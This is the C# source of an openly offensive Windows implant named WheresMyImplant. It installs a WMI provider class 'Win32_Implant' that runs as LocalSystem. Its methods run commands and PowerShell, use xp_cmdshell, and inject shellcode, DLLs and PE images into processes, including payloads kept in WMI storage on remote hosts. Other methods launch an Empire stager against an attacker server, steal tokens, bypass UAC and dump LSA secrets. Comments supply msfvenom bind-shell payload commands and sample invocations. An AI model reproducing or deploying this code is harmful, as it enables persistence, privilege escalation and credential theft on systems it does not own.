using System;
using System.Collections;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.Configuration.Install;
using System.Diagnostics;
using System.Linq;
using System.Management;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Management.Instrumentation;
using System.Net;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using System.Text;


using System.Reflection;

[assembly: WmiConfiguration(@"root\cimv2", HostingModel = ManagementHostingModel.LocalSystem), AssemblyKeyFileAttribute("sgKey.snk")]
namespace WheresMyImplant
{

    [System.ComponentModel.RunInstaller(true)]
    public class MyInstall : DefaultManagementInstaller
    {
        public override void Install(IDictionary stateSaver)
        {
            try
            {
                new System.EnterpriseServices.Internal.Publish().GacInstall("WhereMyImplant.dll");
                base.Install(stateSaver);
                RegistrationServices registrationServices = new RegistrationServices();
            }
            catch { }
        }

        public override void Uninstall(IDictionary savedState)
        {

            try
            {
                new System.EnterpriseServices.Internal.Publish().GacRemove("WhereMyImplant.dll");
                ManagementClass managementClass = new ManagementClass(@"root\cimv2:Win32_Implant");
                managementClass.Delete();
            }
            catch { }

            try
            {
                base.Uninstall(savedState);
            }
            catch { }
        }
    }

    [ManagementEntity(Name = "Win32_Implant")]
    public class Implant
    {   
        [ManagementTask]
        public static string RunCMD(string command, string parameters)
        {
            RunCommandPrompt runCommandPrompt = new RunCommandPrompt(command, parameters);
            return runCommandPrompt.GetOutput();
        }
        
        [ManagementTask]
        public static string RunPowerShell(string command)
        {
            RunPowerShell runPowerShell = new RunPowerShell(command);
            return runPowerShell.GetOutput();
        }
        
        [ManagementTask]
        public static string RunXpCmdShell(string server, string database, string username, string password, string command)
        {
            //Invoke-CimMethod -Class Win32_Implant -Name RunXpCmdShell -Argument @{command="whoami"; database=""; server="sqlserver"; username="sa"; password="password"}
            RunXPCmdShell runXPCmdShell = new RunXPCmdShell(server, database, username, password, command);
            return runXPCmdShell.GetOutput();
        }
        
        /*
        [ManagementTask]
        public static string InjectShellCode(string shellCodeString)
        {
            InjectShellCode injectShellCode = new InjectShellCode(shellCodeString);
            return injectShellCode.GetOutput();
        }
        */
        
        [ManagementTask]
        public static string InjectShellCode(string shellCodeString, Int32 processId)
        {
            //msfvenom -p windows/x64/exec --format csharp CMD=calc.exe
            //Invoke-CimMethod -Class Win32_Implant -Name InjectShellCodeRemote -Argument @{shellCodeString=$payload; processId=[UInt32]432}
            InjectShellCodeRemote injectShellCodeRemote = new InjectShellCodeRemote(shellCodeString, (UInt32)processId);
            return injectShellCodeRemote.GetOutput();
        }

        [ManagementTask]
        public static string InjectShellCodeWMIFSB64(string wmiClass, string fileName, Int32 processId)
        {
            //msfvenom -p windows/x64/exec --format csharp CMD=calc.exe
            //Invoke-CimMethod -Class Win32_Implant -Name InjectShellCodeRemote -Argument @{shellCodeString=$payload; processId=[UInt32]432}
            ConnectionOptions options = new ConnectionOptions();
            options.Impersonation = System.Management.ImpersonationLevel.Impersonate;
            ManagementScope scope = new ManagementScope("\\\\.\\root\\cimv2", options);
            scope.Connect();

            ObjectQuery queryIndexCount = new ObjectQuery("SELECT Index FROM WMIFS WHERE FileName = \'" + fileName + "\'");
            ManagementObjectSearcher searcherIndexCount = new ManagementObjectSearcher(scope, queryIndexCount);
            ManagementObjectCollection queryIndexCollection = searcherIndexCount.Get();
            int indexCount = queryIndexCollection.Count;

            String EncodedText = "";
            for (int i = 0; i < indexCount; i++)
            {
                ObjectQuery queryFilePart = new ObjectQuery("SELECT FileStore FROM WMIFS WHERE FileName = \'" + fileName + "\' AND Index = \'" + i + "\'");
                ManagementObjectSearcher searcherFilePart = new ManagementObjectSearcher(scope, queryFilePart);
                ManagementObjectCollection queryCollection = searcherFilePart.Get();
                foreach (ManagementObject filePart in queryCollection)
                {
                    EncodedText += filePart["FileStore"].ToString();
                }
            }
            byte[] peBytes = System.Convert.FromBase64String(EncodedText);
            String shellCodeString = System.Text.Encoding.Unicode.GetString(peBytes);

            InjectShellCodeRemote injectShellCodeRemote = new InjectShellCodeRemote(shellCodeString, (UInt32)processId);
            return injectShellCodeRemote.GetOutput();
        }

        /*
        [ManagementTask]
        public static string InjectDll(string library)
        {
            InjectDll injectDll = new InjectDll(library);
            return injectDll.GetOutput();
        }
        */

        [ManagementTask]
        public static string InjectDll(string library, Int32 processId)
        {
            //msfvenom -p windows/x64/shell_bind_tcp --format dll --arch x64 > /tmp/bind64.dll
            //Invoke-CimMethod -ClassName Win32_Implant -Name InjectDllRemote -Arguments @{library = "C:\bind64.dll"; processId = [UInt32]3372}
            InjectDllRemote injectDllRemote = new InjectDllRemote(library, (UInt32)processId);
            return injectDllRemote.GetOutput();
        }

        [ManagementTask]
        public static void InjectDllWMIFS(string parameters, string FileName, string process)
        {
            //http://www.codingvision.net/miscellaneous/c-inject-a-dll-into-a-process-w-createremotethread
            ConnectionOptions options = new ConnectionOptions();
            options.Impersonation = System.Management.ImpersonationLevel.Impersonate;
            ManagementScope scope = new ManagementScope("\\\\.\\root\\cimv2", options);
            scope.Connect();

            ObjectQuery queryIndexCount = new ObjectQuery("SELECT Index FROM WMIFS WHERE FileName = \'" + FileName + "\'");
            ManagementObjectSearcher searcherIndexCount = new ManagementObjectSearcher(scope, queryIndexCount);
            ManagementObjectCollection queryIndexCollection = searcherIndexCount.Get();
            int indexCount = queryIndexCollection.Count;

            String EncodedText = "";
            for (int i = 0; i < indexCount; i++)
            {
                ObjectQuery queryFilePart = new ObjectQuery("SELECT FilePart FROM WMIFS WHERE FileName = \'" + FileName + "\' AND Index = \'" + i + "\'");
                ManagementObjectSearcher searcherFilePart = new ManagementObjectSearcher(scope, queryFilePart);
                ManagementObjectCollection queryCollection = searcherFilePart.Get();
                EncodedText += queryCollection.ToString();
            }
            byte[] fileBytes = System.Convert.FromBase64String(EncodedText);

            Process targetProcess;
            if (process == "")
            {
                targetProcess = Process.GetCurrentProcess();
            }
            else
            {
                targetProcess = Process.GetProcessesByName(process)[0];
            }
        }
       
       /*
        [ManagementTask]
        public static string InjectPeFromFile(string fileName, string parameters)
        {
           InjectPE injectPE = new InjectPE(new PELoader(fileName), parameters);
           return injectPE.GetOutput();
        }
        */

        [ManagementTask]
        public static string InjectPeFile(Int32 processId, string fileName, string parameters)
        {
            //Invoke-CimMethod -ClassName Win32_Implant -Name InjectPeFromFileRemote -Arguments @{processId=5648; fileName="C:\bind64.exe"; parameters=""}

            PELoader peLoader = new PELoader(fileName);
            InjectPERemote injectPE = injectPE = new InjectPERemote((UInt32)processId, peLoader, parameters);
            string output = "";
           
            try
            {
                injectPE.execute();
            }
            catch
            {
                output = "[-] Execution Failed\n";
            }
            finally
            {
                output += injectPE.GetOutput();
            }
           return output;
        }

        [ManagementTask]
        public static string InjectPeString(Int32 processId, string peString, string parameters)
        {
            string output = "";
            PELoader peLoader = new PELoader(System.Convert.FromBase64String(peString));
            //byte[] peBytes = System.Convert.FromBase64String(peString);
            //PELoader peLoader = new PELoader(peBytes);
            InjectPE injectPE = new InjectPE(peLoader, parameters);
            output += injectPE.GetOutput();
            return output;
        }

        [ManagementTask]
        public static string InjectPeWMIFS(Int32 processId, string wmiClass, string fileName, string parameters)
        {
           string output = "";

           ConnectionOptions options = new ConnectionOptions();
           options.Impersonation = System.Management.ImpersonationLevel.Impersonate;
           ManagementScope scope = new ManagementScope("\\\\.\\root\\cimv2", options);
           scope.Connect();

           ObjectQuery queryIndexCount = new ObjectQuery("SELECT Index FROM WMIFS WHERE FileName = \'" + fileName + "\'");
           ManagementObjectSearcher searcherIndexCount = new ManagementObjectSearcher(scope, queryIndexCount);
           ManagementObjectCollection queryIndexCollection = searcherIndexCount.Get();
           int indexCount = queryIndexCollection.Count;

           String EncodedText = "";
           for (int i = 0; i < indexCount; i++)
           {
               ObjectQuery queryFilePart = new ObjectQuery("SELECT FileStore FROM WMIFS WHERE FileName = \'" + fileName + "\' AND Index = \'" + i + "\'");
               ManagementObjectSearcher searcherFilePart = new ManagementObjectSearcher(scope, queryFilePart);
               ManagementObjectCollection queryCollection = searcherFilePart.Get();
               foreach (ManagementObject filePart in queryCollection)
               {
                   EncodedText += filePart["FileStore"].ToString();
               }
           }

           byte[] peBytes = System.Convert.FromBase64String(EncodedText);
           PELoader peLoader = new PELoader(peBytes);
           InjectPERemote injectPE = new InjectPERemote((UInt32)processId, peLoader, parameters);
           try
           {
               injectPE.execute();
           }
           catch
           {
               output = "[-] Execution Failed\n";
           }
           finally
           {
               output += injectPE.GetOutput();
           }
           return output;
        }

        [ManagementTask]
        public static string InjectPeWMIFSRemote(Int32 processId, string wmiClass, string system, string username, string password, string fileName, string parameters)
        {
            string output = "";

            ConnectionOptions options = new ConnectionOptions();

            options.Username = username;
            options.Password = password;

            ManagementScope scope = new ManagementScope("\\\\" + system + "\\root\\cimv2", options);
            scope.Connect();

            ObjectQuery queryIndexCount = new ObjectQuery("SELECT Index FROM WMIFS WHERE FileName = \'" + fileName + "\'");
            ManagementObjectSearcher searcherIndexCount = new ManagementObjectSearcher(scope, queryIndexCount);
            ManagementObjectCollection queryIndexCollection = searcherIndexCount.Get();
            int indexCount = queryIndexCollection.Count;

            String EncodedText = "";
            for (int i = 0; i < indexCount; i++)
            {
                ObjectQuery queryFilePart = new ObjectQuery("SELECT FileStore FROM WMIFS WHERE FileName = \'" + fileName + "\' AND Index = \'" + i + "\'");
                ManagementObjectSearcher searcherFilePart = new ManagementObjectSearcher(scope, queryFilePart);
                ManagementObjectCollection queryCollection = searcherFilePart.Get();
                foreach (ManagementObject filePart in queryCollection)
                {
                    EncodedText += filePart["FileStore"].ToString();
                }
            }

            byte[] peBytes = System.Convert.FromBase64String(EncodedText);
            PELoader peLoader = new PELoader(peBytes);
            InjectPERemote injectPE = new InjectPERemote((UInt32)processId, peLoader, parameters);
            try
            {
                injectPE.execute();
            }
            catch
            {
                output = "[-] Execution Failed\n";
            }
            finally
            {
                output += injectPE.GetOutput();
            }
            return output;
        }
       
        [ManagementTask]
        //Invoke-WmiMethod -Class Win32_Implant -Name EmpireStager -ArgumentList "powershell","http://192.168.255.100:80","q|Q]KAe!{Z[:Tj<s26;zd9m7-_DMi3,5"
        //Invoke-WmiMethod -Class Win32_Implant -Name EmpireStager -ArgumentList "dotnet","http://192.168.255.100:80","q|Q]KAe!{Z[:Tj<s26;zd9m7-_DMi3,5"
        public static string Empire(string server, string stagingKey, string language)
        {
           EmpireStager empireStager = new EmpireStager(server, stagingKey, language);
           empireStager.execute();
           return empireStager.GetOutput();
        }

        [ManagementTask]
        public static String Tokenvator(string command)
        {
            Tokens tokenvator = new Tokens();
            if (command.ToLower().Contains("getsystem"))
            {
                String[] split = command.Split(' ');
                if (split.Length >= 2)
                {
                    tokenvator.GetSystem(split[1]);
                }
                else
                {
                    tokenvator = new Tokens();
                    tokenvator.GetSystem("cmd.exe");
                }
            }
            else if (command.ToLower().Contains("gettrustedinstaller"))
            {
                String[] split = command.Split(' ');
                if (split.Length >= 2)
                {
                    tokenvator.GetTrustedInstaller(split[1]);
                }
                else
                {
                    tokenvator.GetTrustedInstaller("cmd.exe");
                }
            }
            else if (command.ToLower().Contains("stealtoken"))
            {
                String[] split = command.Split(' ');
                if (split.Length >= 3)
                {
                    tokenvator.StartProcessAsUser(Int32.Parse(split[1]), split[2]);
                }
                else
                {
                    tokenvator.StartProcessAsUser(Int32.Parse(split[1]), "cmd.exe");
                }
            }
            else
            {
                tokenvator = new Tokens();
                tokenvator.GetHelp();
            }
            return tokenvator.GetOutput();
        }

        [ManagementTask]
        public static String BypassUac(string command)
        {
            RestrictedToken tokenvator = new RestrictedToken();
            String[] split = command.Split(' ');
            if (split.Length == 2)
            {
                tokenvator.BypassUAC(Int32.Parse(split[1]), split[2]);
            }
            else if (split.Length == 3)
            {
                tokenvator = new RestrictedToken();
                tokenvator.BypassUAC(Int32.Parse(split[1]), "cmd.exe");
            }
            else
            {
                tokenvator = new RestrictedToken();
                tokenvator.GetHelp();
            }
            return tokenvator.GetOutput();
        }

        [ManagementTask]
        public static String DumpLsa()
        {
            LSASecrets lsaSecrets = new LSASecrets();
            if (!lsaSecrets.bailOut)
            {
                lsaSecrets.DumpLSASecrets();
            }
            return lsaSecrets.GetOutput();
        }
    }
}